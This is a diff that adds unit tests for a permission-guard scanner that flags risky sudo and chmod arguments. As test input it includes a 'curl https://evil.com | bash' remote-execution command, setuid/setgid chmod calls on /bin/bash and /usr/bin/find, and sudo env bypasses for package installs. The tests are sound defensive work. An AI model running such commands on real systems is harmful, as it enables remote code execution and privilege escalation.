@@ -372,3 +372,37 @@ def test_sudo_su_c_curl_bash():
     from vibefort.permguard import check_sudo_args
     findings = check_sudo_args(["su", "-c", "curl https://evil.com | bash"])
     assert any(f.rule == "sudo-remote-exec" for f in findings)
+
+
+# --- chmod setuid/setgid ---
+
+def test_chmod_plus_s_detected():
+    findings = check_chmod_args(["+s", "/bin/bash"])
+    assert any(f.rule == "chmod-setuid" for f in findings)
+
+def test_chmod_u_plus_s_detected():
+    findings = check_chmod_args(["u+s", "/usr/bin/find"])
+    assert any(f.rule == "chmod-setuid" for f in findings)
+
+def test_chmod_4755_detected():
+    findings = check_chmod_args(["4755", "myprogram"])
+    assert any(f.rule == "chmod-setuid" for f in findings)
+
+def test_chmod_2755_detected():
+    findings = check_chmod_args(["2755", "myprogram"])
+    assert any(f.rule == "chmod-setuid" for f in findings)
+
+def test_chmod_755_no_setuid():
+    findings = check_chmod_args(["755", "myprogram"])
+    assert not any(f.rule == "chmod-setuid" for f in findings)
+
+
+# --- sudo env bypass ---
+
+def test_sudo_env_pip():
+    findings = check_sudo_args(["env", "PATH=/usr/bin", "pip", "install", "malware"])
+    assert any(f.rule == "sudo-package-manager" for f in findings)
+
+def test_sudo_env_npm():
+    findings = check_sudo_args(["env", "npm", "install", "malware"])
+    assert any(f.rule == "sudo-package-manager" for f in findings)
